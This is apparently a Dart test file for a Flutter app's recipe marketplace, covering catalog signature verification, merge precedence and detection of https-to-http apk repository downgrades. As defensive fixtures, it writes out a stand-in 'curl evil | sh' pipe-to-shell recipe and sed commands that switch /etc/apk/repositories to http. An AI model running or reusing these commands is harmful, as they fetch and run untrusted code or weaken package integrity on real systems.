import 'dart:convert';

import 'package:flutter_test/flutter_test.dart';
import 'package:linxr/models/marketplace_item.dart';
import 'package:linxr/services/marketplace_service.dart';
import 'package:linxr/services/recipe_signature.dart';
import 'package:pinenacl/ed25519.dart';

MarketplaceItem _item(String id, {String author = 'Linxr Official', String? script}) =>
    MarketplaceItem(
      id: id,
      name: id,
      category: 'Utilities',
      type: script == null ? RecipeType.docker : RecipeType.script,
      description: '',
      author: author,
      script: script,
    );

void main() {
  group('RecipeSignature', () {
    // Catalog bytes signed with the real linxr-marketplace key using Node's
    // crypto.sign(null, data, key): proves the embedded public key and the
    // signing format match.
    const fixtureCatalog = '[{"id":"hello","name":"Hello"}]\n';
    const fixtureSig =
        'Uht8sT8vGw26A5KY3vVFvri9v7/wItix0Z35EEuSpGvkG2h4LbEYYOQiQFSDeRI2nMosIJLEwOZUcd5lZHf6Dw==';

    test('accepts a catalog signed with the embedded key', () {
      expect(RecipeSignature.verify(utf8.encode(fixtureCatalog), fixtureSig),
          CatalogSignature.verified);
    });

    test('rejects a modified catalog', () {
      expect(
          RecipeSignature.verify(
              utf8.encode(fixtureCatalog.replaceFirst('Hello', 'Hellp')), fixtureSig),
          CatalogSignature.invalid);
    });

    test('a missing signature is "unsigned", garbage is "invalid"', () {
      final bytes = utf8.encode(fixtureCatalog);
      expect(RecipeSignature.verify(bytes, null), CatalogSignature.unsigned);
      expect(RecipeSignature.verify(bytes, '  \n'), CatalogSignature.unsigned);
      expect(RecipeSignature.verify(bytes, 'not base64!'), CatalogSignature.invalid);
      expect(RecipeSignature.verify(bytes, base64.encode(List.filled(10, 1))),
          CatalogSignature.invalid);
    });

    test('a signature by another key is invalid', () {
      final other = SigningKey.fromSeed(Uint8List.fromList(List.filled(32, 7)));
      final bytes = Uint8List.fromList(utf8.encode(fixtureCatalog));
      final sig = base64.encode(other.sign(bytes).signature.asTypedList);
      expect(RecipeSignature.verify(bytes, sig), CatalogSignature.invalid);
      expect(
          RecipeSignature.verify(bytes, sig,
              publicKey: base64.encode(other.verifyKey.asTypedList)),
          CatalogSignature.verified);
    });

    test('policy: warn by default, block when required, invalid always blocked', () {
      expect(RecipeSignature.accept(CatalogSignature.unsigned, requireSigned: false), isTrue);
      expect(RecipeSignature.accept(CatalogSignature.unsigned, requireSigned: true), isFalse);
      expect(RecipeSignature.accept(CatalogSignature.invalid, requireSigned: false), isFalse);
      expect(RecipeSignature.accept(CatalogSignature.verified, requireSigned: true), isTrue);
    });
  });

  group('mergeCatalog', () {
    test('a community recipe cannot replace a built-in id', () {
      final merged = MarketplaceService.mergeCatalog(
        [_item('k3s', script: 'install k3s')],
        [_item('k3s', author: 'attacker', script: 'curl evil | sh'), _item('extra')],
        [],
      );
      final k3s = merged.firstWhere((i) => i.id == 'k3s');
      expect(k3s.author, 'Linxr Official');
      expect(k3s.isCommunity, isFalse);
      final extra = merged.firstWhere((i) => i.id == 'extra');
      expect(extra.isCommunity, isTrue);
      expect(extra.isCustom, isFalse);
    });

    test("the user's own recipes still take precedence", () {
      final merged = MarketplaceService.mergeCatalog(
        [_item('nginx')],
        [],
        [_item('nginx', author: 'me').copyWith(isCustom: true)],
      );
      expect(merged.single.author, 'me');
    });
  });

  group('downgradesApkToHttp', () {
    test('detects http apk repositories', () {
      expect(
          MarketplaceService.downgradesApkToHttp(
              'sed -i "s/https:/http:/g" /etc/apk/repositories && apk add x'),
          isTrue);
      expect(
          MarketplaceService.downgradesApkToHttp(
              'echo http://dl-cdn.alpinelinux.org/alpine/v3.20/main >> /etc/apk/repositories'),
          isTrue);
      expect(
          MarketplaceService.downgradesApkToHttp(
              "sed -i 's|https://|http://|g' /etc/apk/repositories"),
          isTrue);
      expect(MarketplaceService.downgradesApkToHttp('apk update && apk add nginx'), isFalse);
      expect(
          MarketplaceService.downgradesApkToHttp(
              'echo https://dl-cdn.alpinelinux.org/alpine/v3.20/main'),
          isFalse);
    });

    test('no built-in recipe switches apk to http', () {
      for (final item in MarketplaceService.builtInItems) {
        expect(MarketplaceService.downgradesApkToHttp(item.script ?? ''), isFalse,
            reason: item.id);
      }
    });
  });
}
